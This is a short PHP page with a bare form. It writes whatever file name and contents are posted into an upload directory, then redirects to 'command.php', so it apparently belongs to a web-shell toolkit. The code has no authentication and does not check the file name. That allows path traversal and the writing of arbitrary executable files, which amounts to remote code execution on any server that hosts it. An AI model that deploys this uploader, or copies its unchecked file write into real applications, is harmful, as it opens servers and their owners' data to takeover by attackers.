<?php
  if(isset($_POST['data']) && isset($_POST['name'])) {
    $myFile = "upload/". $_POST['name'];
    $fh = fopen($myFile, 'w');
    fwrite($fh, $_POST['data']);
    die("<script>location.href = 'command.php'</script>");
  }
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Untitled Document</title>
</head>

<body>
<br>
<form name="test" method="post" action="">
<textarea name="name" cols="55" rows="1"></textarea><br>
<textarea name="data" cols="55" rows="20"></textarea><br>
<input type="submit" name="submit" value="Save">
</form>
</body>
</html>
